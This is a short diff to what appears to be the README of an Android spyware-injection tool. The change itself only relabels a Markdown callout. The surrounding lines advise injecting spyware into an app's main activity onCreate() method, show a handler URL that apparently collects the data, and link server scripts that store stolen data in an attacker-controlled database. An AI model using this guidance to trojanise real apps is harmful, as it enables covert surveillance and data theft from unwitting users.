@@ -107,7 +107,7 @@ A high level overview of the steps involved during code injection is:
                         http://192.168.0.24/handler.php
     ```
 
-    > [!Note] 
+    > [!IMPORTANT] 
     > For optimal results, inject `Spyware` on the `onCreate()` method of the application main activity.
 
     Server-side scripts used to insert and store the stolen data sent into an attacker-controlled `MySQL` database are available under [scripts](https://github.com/aress31/sci/tree/master/scripts).
